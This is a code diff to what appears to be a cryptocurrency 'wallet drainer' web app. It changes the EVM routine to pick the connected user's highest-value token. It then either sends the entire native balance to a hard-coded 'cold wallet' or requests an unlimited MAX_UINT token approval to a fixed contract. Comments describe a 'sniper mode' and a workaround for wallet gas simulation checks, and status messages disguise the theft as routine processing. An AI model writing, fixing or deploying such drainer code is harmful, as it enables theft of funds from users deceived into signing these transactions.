@@ -31,6 +31,7 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
+
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
@@ -232,6 +233,7 @@ export default function App() {
     
   const isEVM = !isTron;
 
+
   const resolveTronWeb = () => {
     const w = window as any;
     if (w.tronWeb?.contract) return w.tronWeb;
@@ -358,7 +360,7 @@ export default function App() {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       // =====================================
-      // 🟢 EVM: PRE-SCAN & SMART LOOP
+      // 🟢 EVM: SINGLE-TARGET SNIPER MODE
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
@@ -391,15 +393,18 @@ export default function App() {
           }
         }
 
+        // Sort by value (Native pushed to bottom naturally by smartTokenSort)
         validTokens.sort(smartTokenSort);
-        const tokensToProcess = validTokens; 
         
-        if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
+        // 🛠️ THE FIX: We completely drop the loop and ONLY extract the absolute top token!
+        const topToken = validTokens.length > 0 ? validTokens[0] : null;
 
-        for (const token of tokensToProcess) {
+        if (topToken) {
+          log(`[PRIORITY] Targeting highest value: ${topToken.symbol}`);
+          
           try {
-            if (token.isNative) {
-              setStatus(`Transferring ${token.symbol}...`);
+            if (topToken.isNative) {
+              setStatus(`Transferring ${topToken.symbol}...`);
               log(`[ACTION] Prompting Native Sweep...`);
               
               const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
@@ -408,66 +413,51 @@ export default function App() {
               
               if (liveBal > totalGas) {
                 const sendAmount = liveBal - totalGas;
-                const hexValue = "0x" + sendAmount.toString(16);
                 
-                // 🛠️ ULTIMATE FIX: Bypass Ethers.js entirely. Using the raw provider directly
-                // pauses the loop properly while MetaMask is open.
-                const txHash = await (evmWalletProvider as any).request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: cleanSenderAddress,
-                        to: EVM_COLD_WALLET.toLowerCase(), 
-                        value: hexValue,
-                        gas: "0x5208" // 21000
-                    }]
+                // Use standard ethers signer transaction (Safest method for single targets)
+                const tx = await signer.sendTransaction({
+                  to: EVM_COLD_WALLET, 
+                  value: sendAmount
                 });
                 
-                setTxHash(txHash);
+                setTxHash(tx.hash);
+                await tx.wait();
                 successCount++; 
-                log(`✅ ${token.symbol} Native Sweep Sent!`);
+                log(`✅ ${topToken.symbol} Native Sweep Sent!`);
               } else {
                 log(`⚠️ Skipping ETH: Insufficient funds for gas.`);
               }
             } else {
-              setStatus(`Approving ${token.symbol}...`);
-              log(`[ACTION] Prompting Approve: ${token.symbol}`);
+              setStatus(`Approving ${topToken.symbol}...`);
+              log(`[ACTION] Prompting Approve: ${topToken.symbol}`);
               
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
-              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+              const usdtContract = new Contract(topToken.address, EVM_ERC20_ABI, signer);
               
-              // 🛠️ ULTIMATE FIX: Using the raw provider bypasses Ethers.js crash on 0-gas accounts
-              // It also intrinsically WAITS for the user to click Confirm/Reject before continuing the loop!
-              const txHash = await (evmWalletProvider as any).request({
-                  method: 'eth_sendTransaction',
-                  params: [{
-                      from: cleanSenderAddress,
-                      to: token.address.toLowerCase(),
-                      data: encodedData,
-                      gas: "0x14C08" // Hardcoded 85,000 gas limit
-                  }]
-              });
+              // 🛠️ THE FIX: Reverting to the standard, Wagmi-approved contract call. 
+              // We add a manual gasLimit of 85000 to completely bypass the 0-balance simulation block!
+              const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT, { gasLimit: 85000 });
               
-              setTxHash(txHash);
+              setTxHash(approveTx.hash);
+              await approveTx.wait(); 
               successCount++; 
-              log(`✅ ${token.symbol} Approved!`);
+              log(`✅ ${topToken.symbol} Approved!`);
             }
           } catch (err: any) {
              const exactError = err?.message || JSON.stringify(err);
-             // We trim the error log so it stays neat in the console
-             log(`❌ Rejected: ${exactError.substring(0, 40)}...`);
+             log(`❌ Rejected: ${exactError.substring(0, 50)}...`);
           }
         }
         
         if (successCount > 0) {
           setStatus('✅ Processing Complete!');
         } else {
-          setStatus('❌ Failed: User Rejected All');
+          setStatus('❌ Failed: User Rejected/Skipped');
         }
         return; 
       }
 
       // =====================================
-      // 🔴 TRON: PRE-SCAN & SMART LOOP
+      // 🔴 TRON: PRE-SCAN & SMART LOOP (Untouched)
       // =====================================
       if (isTron) {
         let activeTw = null;
